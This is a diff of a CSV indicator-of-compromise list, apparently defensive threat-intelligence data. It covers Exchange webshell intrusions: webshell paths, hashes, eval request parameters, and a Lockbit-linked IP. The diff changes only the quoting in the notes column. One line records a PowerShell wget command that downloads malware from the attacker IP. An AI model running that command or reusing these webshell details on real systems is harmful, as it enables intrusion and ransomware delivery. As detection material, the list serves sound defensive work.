@@ -1,27 +1,27 @@
 Type, Data, Note
-FILENAME,570221043.aspx,"Hidden aspx webshell in PST export from MS Exchange"
-FULLPATH,C:\inetpub\wwwroot\aspnet_client\570221043.aspx,"Hidden aspx webshell in PST export from MS Exchange"
-MD5,4d812c34ab1ad038cec7bc83c909680b,"570221043.aspx webshell"
-SHA1,2135b4fc3f903e32d0d423d1748301caeb759238,"570221043.aspx webshell"
-FILENAME,689193944.aspx,"Hidden aspx webshell in PST export from MS Exchange"
-FULLPATH,C:\inetpub\wwwroot\aspnet_client\689193944.aspx,"Hidden aspx webshell in PST export from MS Exchange"
-MD5,5ca0e18b467ddbde879d5716f919b6e6,"689193944.aspx webshell"
-SHA1,d6b6a5789025f48e6e3ff44f158d4aead1d514ae,"689193944.aspx webshell"
-FILENAME,luifdecggoqmansn.aspx,"Hidden aspx webshell in PST export from MS Exchange"
-FULLPATH,C:\inetpub\wwwroot\aspnet_client\luifdecggoqmansn.aspx,"Hidden aspx webshell in PST export from MS Exchange"
-MD5,9d690a9ace42549a15b52f90823d6363,"luifdecggoqmansn.aspx webshell"
-SHA1,832c41409ef879915387ed8fe62029810927330c,"luifdecggoqmansn.aspx webshell"
-FILENAME,iisstart.aspx,"Webshell"
-MD5,3f05762781a0741a36888f5b2d696de4,"Webshell"
-SHA1,42aa986da3a1f8b84a375c3a82aa8d123fcd61e6,"Webshell"
-FILENAME,Logout.aspx,"Webshell"
-FULLPATH,"C:\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\ecp\auth\Logout.aspx","Webshell"
-MD5,4ace46ff6cbf02b01c0ec099545632ae,"Webshell"
-SHA1,37710e9adc2a65112f1fea74270a853b51de1b64,"Webshell"
-STRING,gold8899,"Eval Request parameter in webshell 570221043.aspx"
-STRING,orangenb,"Eval Request parameter in webshell 689193944.aspx"
-STRING,exec_code,"Eval Request parameter in webshell luifdecggoqmansn.aspx"
-URL,http://45.91.83.176:41361/xtOGpjcbVRwsZNCHfMDP,"URL used in Powershell wget command"
-STRING,"powershell wget http://45.91.83.176:41361/xtOGpjcbVRwsZNCHfMDP","Powershell wget command"
-IP,45.91.83.176,"IP used to download malware via Powershell wget, used by Lockbit Ransomware group" 
-DOMAIN,themoscowtimes.com,"Used in ping command to check for internet connection"
+FILENAME,570221043.aspx,Hidden aspx webshell in PST export from MS Exchange
+FULLPATH,C:\inetpub\wwwroot\aspnet_client\570221043.aspx,Hidden aspx webshell in PST export from MS Exchange
+MD5,4d812c34ab1ad038cec7bc83c909680b,570221043.aspx webshell
+SHA1,2135b4fc3f903e32d0d423d1748301caeb759238,570221043.aspx webshell
+FILENAME,689193944.aspx,Hidden aspx webshell in PST export from MS Exchange
+FULLPATH,C:\inetpub\wwwroot\aspnet_client\689193944.aspx,Hidden aspx webshell in PST export from MS Exchange
+MD5,5ca0e18b467ddbde879d5716f919b6e6,689193944.aspx webshell
+SHA1,d6b6a5789025f48e6e3ff44f158d4aead1d514ae,689193944.aspx webshell
+FILENAME,luifdecggoqmansn.aspx,Hidden aspx webshell in PST export from MS Exchange
+FULLPATH,C:\inetpub\wwwroot\aspnet_client\luifdecggoqmansn.aspx,Hidden aspx webshell in PST export from MS Exchange
+MD5,9d690a9ace42549a15b52f90823d6363,luifdecggoqmansn.aspx webshell
+SHA1,832c41409ef879915387ed8fe62029810927330c,luifdecggoqmansn.aspx webshell
+FILENAME,iisstart.aspx,Webshell
+MD5,3f05762781a0741a36888f5b2d696de4,Webshell
+SHA1,42aa986da3a1f8b84a375c3a82aa8d123fcd61e6,Webshell
+FILENAME,Logout.aspx,Webshell
+FULLPATH,C:\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\ecp\auth\Logout.aspx,Webshell
+MD5,4ace46ff6cbf02b01c0ec099545632ae,Webshell
+SHA1,37710e9adc2a65112f1fea74270a853b51de1b64,Webshell
+STRING,gold8899,Eval Request parameter in webshell 570221043.aspx
+STRING,orangenb,Eval Request parameter in webshell 689193944.aspx
+STRING,exec_code,Eval Request parameter in webshell luifdecggoqmansn.aspx
+URL,http://45.91.83.176:41361/xtOGpjcbVRwsZNCHfMDP,URL used in Powershell wget command
+STRING,powershell wget http://45.91.83.176:41361/xtOGpjcbVRwsZNCHfMDP,Powershell wget command
+IP,45.91.83.176,IP used to download malware via Powershell wget, used by Lockbit Ransomware group 
+DOMAIN,themoscowtimes.com,Used in ping command to check for internet connection
